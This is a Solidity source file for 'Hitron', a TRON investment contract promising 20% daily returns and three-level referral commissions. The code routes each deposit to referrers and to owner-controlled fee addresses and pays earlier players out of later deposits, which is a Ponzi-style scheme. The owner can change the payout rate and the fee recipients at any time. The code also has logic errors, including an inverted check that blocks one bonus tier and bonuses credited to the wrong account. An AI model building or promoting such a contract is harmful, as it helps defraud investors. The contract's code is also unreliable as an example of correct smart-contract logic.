//SourceUnit: Hitron.sol


/*
          


            
                               
    20% Per Day                                                  
    12% Referral Commission 


    3 Level Referral
    Level 1 = 7%                                                    
    Level 2 =  3%                                                   
    Level 3 =  2%                                                   
    
    
    // Website: http://www.hitron.me



*/
pragma solidity ^0.4.17;

contract Hitron {

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint private setTron = 50000000000;
    uint public totalPayout;
    uint private nowtime = now;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 100000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 2364066; //DAILY 20%
    uint private releaseTime = 1594308600;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
    address private feed3 = msg.sender;
   
    uint256 public withdrawFee;
    mapping(address => bool) public whiteListed;
    
    
     
    address owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        uint reward_earned;
  
        
    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
    }
    
     struct Reward{
       
        bool r1;
        bool r2;
        bool r3;
        bool r4;
        bool r5;
        bool r6;
    }
    
    

  
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
    mapping(address => Reward) public Rewards;

    constructor(address _feed1, address _feed2, address _feed3) public {
      owner = msg.sender;
        withdrawFee = 0;
        whiteListed[owner] = true;
        feed1 = _feed1;
        feed2 = _feed2;
        feed3 = _feed3;
    }
    


    function register(address _addr, address _affAddr) private{
        
        
      Player storage player = players[_addr];
      
     

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
      
      setRefCount(_addr,_affAddr);
       
      
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
    
        preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
        preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
        preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
      
     }
    
    
    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        

        uint depositAmount = msg.value;
        
        Player storage player = players[msg.sender];
    
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            
            // if affiliator is not admin as well as he deposited some amount
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
       uint  business = players[_affAddr].td_business;
        uint livng_time = now.sub(players[_affAddr].j_time);
        if( livng_time <=  604800)
        {
            if(business >= 100000000000)
            {
                  
                  if(!Rewards[_affAddr].r1)
                  {
                     player.reward_earned = player.reward_earned.add(4000000000);
                    _affAddr.transfer(4000000000);
                    Rewards[_affAddr].r1 = true;
                    
                  }
                  
            }
        }
        else if(livng_time <=  2592000)
        {
            //30 day
            
                if(business >= 500000000000)
                {
                    if(!Rewards[_affAddr].r2)
                  {
                     player.reward_earned = player.reward_earned.add(20000000000);
                    _affAddr.transfer(20000000000);
                    Rewards[_affAddr].r2 = true;
                  }
                  
                }
            
            
        }
         else if(livng_time <=  4320000)
        {
            //50 day
            if(business >= 1500000000000)
            {
                if(!Rewards[_affAddr].r3)
                 {
                     player.reward_earned = player.reward_earned.add(50000000000);
                    _affAddr.transfer(50000000000);
                    Rewards[_affAddr].r3 = true;
                 }
            }
        }
         else if(livng_time <=  8640000)
        {
            //100 day
            if(business >= 5000000000000)
            {
                if(!Rewards[_affAddr].r4)
                 {
                     player.reward_earned = player.reward_earned.add(200000000000);
                    _affAddr.transfer(200000000000);
                    Rewards[_affAddr].r4 = true;
                 }
            }
            
        }
         else if(livng_time <=  15552000 )
        {
            //180 days
            if(business >= 10000000000000)
            {
                if(!Rewards[_affAddr].r5)
                 {
                     player.reward_earned = player.reward_earned.add(500000000000);
                    _affAddr.transfer(500000000000);
                    Rewards[_affAddr].r5 = true;
                 }
            }
        }
         else if(livng_time <=  31104000 )
        {
            //360 days
            if(business >= 50000000000000)
            {
                if(Rewards[_affAddr].r6)
                {
                    player.reward_earned = player.reward_earned.add(2000000000000);
                    _affAddr.transfer(2000000000000);
                    Rewards[_affAddr].r6 = true;
                }
            }
        }
        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        uint feed1earn = depositAmount.mul(devCommission).mul(8).div(commissionDivisor);
        uint feed2earn = depositAmount.mul(devCommission).mul(5).div(commissionDivisor);
        uint feed3earn = depositAmount.mul(devCommission).mul(3).div(commissionDivisor);
        
        
        feed1.transfer(feed1earn);
        feed2.transfer(feed2earn);
        feed3.transfer(feed3earn);
        
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        require(msg.value >= withdrawFee || whiteListed[msg.sender] == true);
        
        
        
       
        
        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);


        
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 1296000  && player.time > 0)
        {
            secPassed = 1296000; // 15 days
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
        else if (secPassed > 0 && player.time > 0) {
             collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                    
              uint maxProfit = (player.trxDeposit.mul(240)).div(100);
              uint paid = player.payoutSum;
              if(paid > maxProfit)
              {
               
                    player.trxDeposit = 0;
              }
              
                msg.sender.transfer(payout);
             
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        //uint256 _allaff = (_trx.mul(20)).div(100);

       // address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            
            _affRewards = (_trx.mul(7)).div(100);
            
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            _affFrom.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) 
        {
            
            _affRewards = (_trx.mul(3)).div(100);
            totalRefDistributed = totalRefDistributed.add(_affRewards);
            players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);
            _affAddr2.transfer(_affRewards);
  
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                _affAddr3.transfer(_affRewards);
        }

        
    }

     function setWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          if(secPassed > 1296000 )
          {
              secPassed = 1296000;
                 uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
          }else
          {
                  collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
          }
       
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
     function updateFeed1(address _address) public  {
       require(msg.sender==owner);
       feed1 = _address;
    }
    
     function updateFeed2(address _address) public  {
       require(msg.sender==owner);
       feed2 = _address;
    }
     function updateFeed3(address _address) public  {
       require(msg.sender==owner);
       feed3 = _address;
    }
    
    
   
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    
     function setTronamt(uint _setTron) public {
      require(msg.sender==owner);
      setTron = _setTron;
    }
    
    
    
     function setMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minuteRate = _MinuteRate;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}